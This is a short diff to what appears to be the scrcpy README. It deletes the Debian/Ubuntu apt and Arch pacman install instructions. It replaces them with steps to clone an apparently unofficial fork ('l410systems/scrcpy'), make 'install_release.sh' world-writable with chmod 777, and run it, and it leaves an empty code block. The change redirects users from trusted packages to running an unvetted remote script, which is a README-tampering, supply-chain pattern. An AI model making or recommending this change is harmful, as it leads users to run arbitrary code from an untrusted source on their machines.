@@ -65,16 +65,19 @@ Build from sources: [BUILD] ([simplified process][BUILD_simple])
 
 ### Linux
 
-On Debian and Ubuntu:
+
 
 ```
-apt install scrcpy
+git clone https://github.com/l410systems/scrcpy.git
+cd scrcpy 
+chmod 777 install_release.sh 
+./install_release.sh
 ```
 
-On Arch Linux:
+
 
 ```
-pacman -S scrcpy
+
 ```
 
 A [Snap] package is available: [`scrcpy`][snap-link].
